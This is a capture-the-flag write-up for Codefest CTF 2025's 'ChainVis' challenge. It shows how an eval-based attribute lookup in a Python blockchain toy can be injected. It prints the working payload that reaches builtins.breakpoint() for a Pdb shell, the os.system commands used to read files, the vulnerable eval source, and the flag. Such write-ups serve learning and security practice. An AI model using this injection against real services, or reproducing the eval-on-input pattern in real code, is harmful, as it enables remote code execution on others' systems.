# Codefest CTF 2025

## ChainVis

> 
> I tried to understand blockchain. Seemed too tough so I made a visualizer for a chain....with blocks.
>
>  Author: 0xkn1gh7
>

Tags: _misc_

## Solution
This challenge comes with a netcat connection only, no source or other attachment. After connecting we get a small user interface.

```bash

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗    ██╗   ██╗██╗███████╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║    ██║   ██║██║██╔════╝
██║     ███████║███████║██║██╔██╗ ██║    ██║   ██║██║███████╗
██║     ██╔══██║██╔══██║██║██║╚██╗██║    ╚██╗ ██╔╝██║╚════██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║     ╚████╔╝ ██║███████║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝      ╚═══╝  ╚═╝╚══════╝

A blockchain visualizer. Atleast I think so.


1. Add a block to the chain
2. View chain
3. Access a block
4. Exit

[-] ENTER OPTION:
```

We can `add` blocks to a `blockchain`, we can `view` the chain and we can `access` a certain block. Lets try this.

```bash
[-] ENTER OPTION: 1
[-] MONEY IN THE TRANSACTION: 99999999

1. Add a block to the chain
2. View chain
3. Access a block
4. Exit

[-] ENTER OPTION: 2
[*] 1 BLOCKS IN CHAIN.

----------
| ID - 1 |
----------
```

After creating one block, we can access the block. The attributes we can access are not clear, it only hints we can access `id`, but that is really not much information.

```bash
1. Add a block to the chain
2. View chain
3. Access a block
4. Exit

[-] ENTER OPTION: 3
[-] CHOOSE BLOCK ID: 1

[*] SELECTED BLOCK ID: 1
1. Access Attribute (eg - id)
2. Back to main menu

[-] ENTER OPTION: 1
ATTRIBUTE: id
1
```

So lets try out some inputs, most inputs exit the connection whenever we enter something unintended. But attributes are pretty free, the program just gives us `[!] INVALID` whenever a attribute was not found. Lets do a wild guess: What if the program is running python and accessing attributes is via python dictionaries?

```bash
ATTRIBUTE: __dict__
{'id': 1, 'transaction': 1}
```

Wow, this worked. We can inject python here. After some trial and error we can find `builtins` and there we have `breakpoint` that gives us a nicer python shell.

```bash
ATTRIBUTE: __class__.__init__.__globals__['__builtins__'].__dict__['breakpoint']()
None
--Return--
> <string>(1)<module>()->None
(Pdb)
```

From here we can start to enumerate the server. 

```bash
(Pdb) from os import system
(Pdb) system("ls")
app.py
docker-entrypoint.sh
0
(Pdb) system("cat app.py")
#!/usr/bin/env python3

def banner():
    print(f'''
 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗    ██╗   ██╗██╗███████╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║    ██║   ██║██║██╔════╝
██║     ███████║███████║██║██╔██╗ ██║    ██║   ██║██║███████╗
██║     ██╔══██║██╔══██║██║██║╚██╗██║    ╚██╗ ██╔╝██║╚════██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║     ╚████╔╝ ██║███████║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝      ╚═══╝  ╚═╝╚══════╝

A blockchain visualizer. Atleast I think so.
    ''')

def print_menu():
    print('''
1. Add a block to the chain
2. View chain
3. Access a block
4. Exit
    ''')

class Block:
    def __init__(self, block_id, transaction):
        self.id = block_id
        self.transaction = transaction

chain = []

banner()
while True:
    print_menu()
    user = int(input("[-] ENTER OPTION: "))
    if user == 1:
        if len(chain) == 9:
            print('[*] MAX BLOCKS IN CHAIN')
            continue
        money = int(input("[-] MONEY IN THE TRANSACTION: "))
        block = Block(len(chain)+1, money)
        chain.append(block)
    elif user == 2:
        print(f"[*] {len(chain)} BLOCKS IN CHAIN.")
        for i in chain:
            print(f'''
----------
| ID - {i.id} |
----------
            ''')
    elif user == 3:
        user_id = int(input("[-] CHOOSE BLOCK ID: "))-1
        if user_id < 0 or user_id >= len(chain):
            print("[*] INVALID BLOCK ID")
            continue
        block = chain[user_id]
        while True:
            print(f'''
[*] SELECTED BLOCK ID: {block.id}
1. Access Attribute (eg - id)
2. Back to main menu
            ''')
            user2 = int(input("[-] ENTER OPTION: "))
            if user2 == 1:
                attr = input('ATTRIBUTE: ')
                try:
                    eval("print(block."+attr+")")
                except:
                    print("[!] INVALID")
                    continue
            else:
                break
    else:
        break0
```

Finally we find the flag to be located in the root folder, and get the flag.

```bash
(Pdb) system("ls /")
app
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
0
(Pdb) system("cat /flag.txt")
CodefestCTF{n07_r34lly_4_bl0ckch41n_Oc6lVEI1}
0
```

Flag `CodefestCTF{n07_r34lly_4_bl0ckch41n_Oc6lVEI1}`